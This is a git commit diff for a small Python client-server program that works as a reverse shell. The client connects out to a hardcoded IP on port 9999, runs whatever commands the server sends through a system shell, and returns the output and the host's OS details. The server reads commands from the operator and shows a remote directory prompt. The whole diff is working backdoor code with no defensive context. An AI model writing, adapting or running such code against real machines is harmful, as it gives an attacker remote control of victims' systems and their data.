18ba4b8e72196f7b21ea5702ca9c4fb627ec1f1b
Shaykh Siddique <shaykhsiddiqee@gmail.com>
2019-01-17 21:23:34 +0600

    Add files via upload

--- client.py
+++ client.py
@@ -1,26 +1,60 @@
 import socket
 import os
 import subprocess
-
-skt = socket.socket()
-
-host =input("Enter IP address: ")
-port = 9999
-
-print("\nConnecting to "+ str(host)+" .....")
-skt.connect((host, port))
-
-while True:
-    data = skt.recv(1024)
-    if data[:2].decode("utf-8") == "cd":
-        os.chdir(data[3:].decode("utf-8"))
-    if len(data)>0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_string = str(output_byte)
-
-        currentWD = os.getcwd() + " >> "
-
-        skt.send(str.encode(output_string))
+import platform
 
 
+def information_():
+    global host
+    global port
+    global skt
+    #host = input("Enter IP address: ")
+    host = "192.168.0.101"
+    port = 9999
+    skt = socket.socket()
+
+
+def connect_server():
+    try:
+        global host
+        global port
+        global skt
+        print("\nConnecting to " + str(host) + " .....")
+        skt.connect((host, port))
+        print("\nConnection established....\n")
+        return True
+    except socket.error as msg:
+        print("Socket connection error: " + str(msg) + "\n.. Check the server connection...\n")
+
+
+
+def data_receiving():
+    global host
+    global port
+    global skt
+    while True:
+        data = skt.recv(1048576)
+        if data[:2].decode("utf-8") == "cd":
+            os.chdir(data[3:].decode("utf-8"))
+        if data[:8].decode("utf-8") == "platform":
+            out_str = platform.platform()
+            skt.send(str.encode(out_str))
+        elif len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                                   stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_string = str(output_byte)
+
+            currentWD = os.getcwd() + " >> "
+
+            skt.send(str.encode(output_string))
+
+
+def main():
+    information_()
+    connn = False
+    connn = connect_server()
+    if connn:
+        data_receiving()
+
+main()
--- server.py
+++ server.py
@@ -1,5 +1,3 @@
-#for aditional information email: shaykhsiddiqee@gmail.com
-
 import socket
 import sys
 
@@ -36,22 +34,50 @@ def socket_accept():
     print("Connection established | Ip: " + address[0] + " port: " + str(address[1]))
 
     #here goes all commands
+    os_version = os_checker(conn)
+    print("OS version: "+ os_version + "\n")
     send_commands(conn)
     conn.close()
+
+
+def path_finder(conn):
+    cmd = "pwd"
+    conn.send(str.encode(cmd))
+    client_response = str(conn.recv(1048576), "utf-8")
+    out_path = client_response[2:-1].rstrip('\\n')
+    return out_path
+
+
+def os_checker(conn):
+    cmd = "platform"
+    conn.send(str.encode(cmd))
+    client_response = str(conn.recv(1048576), "utf-8")
+    out_os = client_response.rstrip('\\n')
+    return out_os
 
 
 def send_commands(conn):
 
     while True:
-        cmd = input()
+        cmd = input(path_finder(conn)+">>")
         if cmd == "quit":
             conn.close()
             skt.close()
             sys.exit()
         if len(str.encode(cmd))>0:
             conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
+            client_response = str(conn.recv(1048576), "utf-8")
+            #print(client_response, end="")
+            pattern_remover(client_response)
+
+
+def pattern_remover(client_response):
+    output_data = client_response[2:-1].replace('\\n', "^")
+    for ch in output_data:
+        if ch == '^':
+            print("")
+        else:
+            print(ch, end="")
 
 
 def main():
